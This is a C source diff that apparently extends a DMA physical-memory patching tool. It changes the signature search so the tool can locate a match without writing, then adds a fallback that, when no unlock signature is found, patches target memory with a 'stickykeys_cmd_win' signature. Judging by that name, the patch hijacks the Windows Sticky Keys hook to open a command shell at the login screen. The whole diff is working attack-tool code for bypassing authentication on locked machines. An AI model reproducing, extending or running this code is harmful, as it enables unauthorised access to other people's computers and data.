@@ -37,7 +37,7 @@ BOOL Patch_CmpChunk(_In_ PBYTE pbPage, _In_ PSIGNATURE_CHUNK pChunk, _In_opt_ DW
     return FALSE;
 }
 
-BOOL Patch_FindAndPatch(_Inout_ PBYTE pbPage, _In_ PSIGNATURE pSignatures, _In_ DWORD cSignatures, _Out_ PDWORD pdwPatchOffset, _Out_ PDWORD pcbPatch)
+BOOL Patch_FindAndPatch(_Inout_ PBYTE pbPage, _In_ PSIGNATURE pSignatures, _In_ DWORD cSignatures, _Out_ PDWORD pdwPatchOffset, _Out_ PSIGNATURE *pps, _In_ BOOL pPatch)
 {
     DWORD i, o, dwRelBase;
     PSIGNATURE ps;
@@ -54,9 +54,9 @@ BOOL Patch_FindAndPatch(_Inout_ PBYTE pbPage, _In_ PSIGNATURE pSignatures, _In_ 
             o += dwRelBase;
         }
         if(o + ps->chunk[2].cb < 0x1000) {
-            memcpy(pbPage + o, ps->chunk[2].pb, ps->chunk[2].cb);
+            if (pPatch) memcpy(pbPage + o, ps->chunk[2].pb, ps->chunk[2].cb);
             *pdwPatchOffset = o;
-            *pcbPatch = ps->chunk[2].cb;
+            *pps = ps;
             return TRUE;
         }
     }
@@ -67,14 +67,15 @@ BOOL Patch_FindAndPatch(_Inout_ PBYTE pbPage, _In_ PSIGNATURE pSignatures, _In_ 
 
 VOID ActionPatchAndSearch()
 {
-    SIGNATURE oSignatures[CONFIG_MAX_SIGNATURES];
-    DWORD dwoPatch, cbPatch, cSignatures = CONFIG_MAX_SIGNATURES;
-    QWORD qwAddrBase;
+    SIGNATURE oSignatures[CONFIG_MAX_SIGNATURES], oSignatures_cmd[CONFIG_MAX_SIGNATURES];
+    PSIGNATURE pps, pps_cmd;
+    DWORD dwoPatch, dwoPatch_cmd, cSignatures = CONFIG_MAX_SIGNATURES, cSignatures_cmd = CONFIG_MAX_SIGNATURES;
+    QWORD qwAddrBase, qwAddrBase_cmd;
     PBYTE pbBuffer16M = NULL;
     PPAGE_STATISTICS pPageStat = NULL;
-    BOOL result, isModePatch = ctxMain->cfg.tpAction == PATCH;
+    BOOL result, result_cmd, isModePatch = ctxMain->cfg.tpAction == PATCH;
     LPSTR szAction = isModePatch ? "Patch" : "Search";
-    QWORD i, qwoPages, qwPatchList[MAX_NUM_PATCH_LOCATIONS], cPatchList = 0;
+    QWORD i, qwoPages, qwoPages_cmd, qwPatchList[MAX_NUM_PATCH_LOCATIONS], cPatchList = 0;
     // initialize / allocate memory
     if(!(pbBuffer16M = LocalAlloc(0, 0x01000000))) { goto cleanup; }
     qwAddrBase = ctxMain->cfg.qwAddrMin;
@@ -99,7 +100,14 @@ VOID ActionPatchAndSearch()
                 printf("%s: Failed. Invalid patch signature.\n", szAction);
             }
         }
+
+        result_cmd = Util_LoadSignatures("stickykeys_cmd_win", ".sig", oSignatures_cmd, &cSignatures_cmd, 3);
+        if(!result_cmd || !cSignatures_cmd) {
+            printf("%s: Failed. Failed to load signature[stickykeys_cmd_win].\n", szAction);
+        }
     }
+
+    result_cmd = FALSE;
     // loop patch / unlock
     PageStatInitialize(&pPageStat, qwAddrBase, ctxMain->cfg.qwAddrMax, isModePatch ? "Patching" : "Searching", ctxMain->phKMD ? TRUE : FALSE, ctxMain->cfg.fVerbose);
     for(; qwAddrBase < ctxMain->cfg.qwAddrMax; qwAddrBase += 0x01000000) {
@@ -111,12 +119,19 @@ VOID ActionPatchAndSearch()
             goto cleanup;
         }
         for(qwoPages = 0; (qwoPages < 0x01000000) && (qwAddrBase + qwoPages < ctxMain->cfg.qwAddrMax); qwoPages += 0x1000) {
-            result = Patch_FindAndPatch(pbBuffer16M + qwoPages, oSignatures, cSignatures, &dwoPatch, &cbPatch);
+            if (!result_cmd) {
+                result_cmd = Patch_FindAndPatch(pbBuffer16M + qwoPages, oSignatures_cmd, cSignatures_cmd, &dwoPatch_cmd, &pps_cmd, FALSE);
+                qwoPages_cmd = qwoPages;
+                qwAddrBase_cmd = qwAddrBase;
+            }
+
+            result = Patch_FindAndPatch(pbBuffer16M + qwoPages, oSignatures, cSignatures, &dwoPatch, &pps, TRUE);
             if(!result) {
                 continue;
             }
+
             if(isModePatch) {
-                result = DeviceWriteMEM(qwAddrBase + qwoPages + dwoPatch, pbBuffer16M + qwoPages + dwoPatch, cbPatch, 0);
+                result = DeviceWriteMEM(qwAddrBase + qwoPages + dwoPatch, pbBuffer16M + qwoPages + dwoPatch, pps->chunk[2].cb, 0);
             }
             if(result) {
                 if(cPatchList == MAX_NUM_PATCH_LOCATIONS) {
@@ -137,8 +152,16 @@ VOID ActionPatchAndSearch()
         }
     }
     if(0 == cPatchList) {
-        PageStatClose(&pPageStat);
-        printf("%s: Failed. No signature found.\n", szAction);
+        if (result_cmd && isModePatch) {
+            Util_Read16M(pbBuffer16M, qwAddrBase_cmd, pPageStat);
+            memcpy(pbBuffer16M + qwoPages_cmd + dwoPatch_cmd, pps_cmd->chunk[2].pb, pps_cmd->chunk[2].cb);
+            DeviceWriteMEM(qwAddrBase_cmd + qwoPages_cmd + dwoPatch_cmd, pbBuffer16M + qwoPages_cmd + dwoPatch_cmd, pps_cmd->chunk[2].cb, 0);
+            PageStatClose(&pPageStat);
+            printf("Patch: [stickykeys_cmd_win] Successful.\n");
+        } else {
+            PageStatClose(&pPageStat);
+            printf("%s: Failed. No signature found.\n", szAction);
+        }
     }
 cleanup:
     PageStatClose(&pPageStat);
